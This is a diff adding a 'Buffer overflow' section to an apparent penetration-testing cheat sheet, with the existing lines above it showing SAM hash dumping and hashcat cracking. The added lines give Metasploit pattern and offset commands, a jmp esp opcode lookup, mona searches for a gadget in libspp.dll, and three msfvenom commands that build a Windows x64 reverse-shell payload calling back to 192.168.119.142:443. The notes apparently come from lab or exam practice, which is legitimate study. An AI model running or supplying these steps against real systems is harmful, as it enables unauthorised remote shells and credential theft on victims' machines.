@@ -513,6 +513,27 @@ samdump2 system sam -o sam.txt
 hashcat -m1000
 ```
 
+## Buffer overflow
+```
+msf-pattern_create -l 2000
+msf-pattern_offset -l 2000 -q 413461a2
+
+msf-nasm_shell
+nasm > jmp esp
+00000000  FFE4              jmp esp
+
+!mona modules
+!mona find -s "\xff\xe4" -m "libspp.dll"
+
+Common payloads:
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.142 LPORT=443 -b "\x00\x0a\x0d\xff" -f c
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.142 LPORT=443 -b "\x00\x0a\x0d\xff" -f py -v shellcode
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.142 LPORT=443 -b "\x00\x0a\x0d\xff" -f raw
+```
+
+
+
+
 
 
 
